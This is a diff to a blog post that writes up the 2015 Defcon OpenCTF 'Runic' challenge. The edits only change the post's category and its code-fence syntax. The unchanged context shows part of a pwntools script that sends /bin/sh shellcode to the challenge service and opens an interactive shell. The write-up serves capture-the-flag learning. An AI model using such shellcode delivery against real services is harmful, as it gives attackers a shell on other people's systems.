@@ -2,7 +2,7 @@
 layout: post
 title:  "Defcon OpenCTF - Runic"
 date:   2015-08-13 18:03:59
-categories: CTF
+categories: CTF Pwnable
 ---
 
 Below is the main function for Runic:
@@ -20,7 +20,7 @@ We can send a max of 64 bytes of shellcode, which is immediately executed.
 
 The following script simply sends a `/bin/sh` shellcode, and a shell of ours.
 
-{% highlight python %}
+```python
 import sys
 from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git
 
@@ -46,4 +46,4 @@ shellcode = asm(shellcraft.sh())
 r.sendline(shellcode)
 
 r.interactive()
-{% endhighlight %}
+```
